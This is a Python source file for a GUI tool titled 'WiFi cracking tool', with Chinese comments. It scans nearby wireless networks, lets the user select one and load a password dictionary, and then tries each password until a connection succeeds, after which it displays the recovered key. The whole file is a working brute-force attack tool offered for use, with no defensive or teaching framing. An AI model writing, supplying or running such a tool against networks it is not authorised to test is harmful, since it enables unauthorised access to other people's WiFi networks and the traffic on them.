from tkinter import *
from tkinter import ttk
import tkinter.filedialog
import tkinter.messagebox
from sword_pywifi.MyWifi import MyWifi
from tqdm import tqdm

class MY_GUI:
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name

        # 密码文件路径
        self.pwd_file_path = StringVar()

        # 获取破解wifi账号
        self.chinese_ssid = StringVar()

        # 获取wifi密码
        self.cracked_password = StringVar()

        self.wifi = MyWifi()

    def __str__(self):
        return "(WIFI:%s,%s)" % (self.wifi, self.iface.name())

    # 设置窗口
    def set_init_window(self):
        self.init_window_name.title("WIFI破解工具")
        self.init_window_name.geometry("+600+200")

        labelframe = LabelFrame(width=400, height=200, text="配置")
        labelframe.grid(column=0, row=0, padx=10, pady=10)

        search = Button(labelframe, text="搜索附近WiFi", command=self.scans_wifi_list).grid(
            column=0, row=0
        )
        pojie = Button(labelframe, text="开始破解", command=self.readPassWord).grid(
            column=1, row=0
        )

        label = Label(labelframe, text="密码文件路径：").grid(column=0, row=1)
        path = Entry(labelframe, width=12, textvariable=self.pwd_file_path).grid(
            column=1, row=1
        )
        file = Button(labelframe, text="选择路径", command=self.add_mm_file).grid(
            column=2, row=1
        )

        wifi_text = Label(labelframe, text="WiFi账号：").grid(column=0, row=2)
        wifi_input = Entry(labelframe, width=12, textvariable=self.chinese_ssid).grid(
            column=1, row=2
        )
        wifi_mm_text = Label(labelframe, text="WiFi密码：").grid(column=2, row=2)
        wifi_mm_input = Entry(
            labelframe, width=10, textvariable=self.cracked_password
        ).grid(column=3, row=2, sticky=W)

        wifi_labelframe = LabelFrame(text="wifi列表")
        wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)

        # 定义树形结构与滚动条
        self.wifi_tree = ttk.Treeview(
            wifi_labelframe, show="headings", columns=("a", "b", "c", "d")
        )
        vbar = ttk.Scrollbar(
            wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview
        )
        self.wifi_tree.configure(yscrollcommand=vbar.set)

        # 表格的标题
        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=100, anchor="center")
        self.wifi_tree.column("c", width=100, anchor="center")
        self.wifi_tree.column("d", width=100, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="signal")

        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)
        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        vbar.grid(row=4, column=1, sticky=NS)

    # 搜索wifi
    def scans_wifi_list(self):
        chinese_wifi_infos = self.wifi.wifiScan()
        for index, wifi_info in enumerate(chinese_wifi_infos):
            signal, bssid, chinese_ssid, ssid = wifi_info
            self.wifi_tree.insert(
                "",
                "end",
                values=(
                    index + 1,
                    chinese_ssid,
                    bssid,
                    signal,
                    ssid
                ),
            )
        return chinese_wifi_infos

    # 添加密码文件目录
    def add_mm_file(self):
        filename = tkinter.filedialog.askopenfilename()
        self.pwd_file_path.set(filename)

    # Treeview绑定事件
    def onDBClick(self, event):
        selection = event.widget.selection()
        self.wifi_selection = self.wifi_tree.item(selection, "values")
        self.chinese_ssid.set(self.wifi_selection[1])
        print("you clicked on", self.wifi_tree.item(selection, "values")[1])

    # 读取密码字典，进行匹配
    def readPassWord(self):
        getFilePath = self.pwd_file_path.get()
        print(f"* 密码文件路径：{getFilePath}")

        # 中文问题需要编码回来
        ssid = self.wifi_selection[-1]
        chinese_ssid = self.wifi_selection[1]
        print(f"* 选择WiFi账号：{chinese_ssid}")

        self.pwdfilehander = open(getFilePath, "r", errors="ignore")
        
        try:        
            # 打开文件
            passwds = []
            with open(getFilePath, "r", errors="ignore") as file:
                for line in file:
                    passwd = line[:-1] if line[-1] == '\n' else line
                    passwds.append(passwd)
            
            for passwd in tqdm(passwds):        
                # 破解成功
                if self.wifi.wifiConnect(ssid, passwd):
                    print(f'[{passwd}]')
                    print("!!!!!!!!!!!!!!!!!WiFi已自动连接!!!!!!!!!!!!!!!!!")
                    
                    self.cracked_password.set(passwd)
                    tkinter.messagebox.showinfo("提示", "破解成功！！！")
                    break
                else:
                    print(f'[{passwd}]')
        except KeyboardInterrupt: # Ctrl-C中止程序
            print("中止程序")

def main():
    init_window = Tk()
    ui = MY_GUI(init_window)
    ui.set_init_window()
    init_window.mainloop()

if __name__ == "__main__":
    main()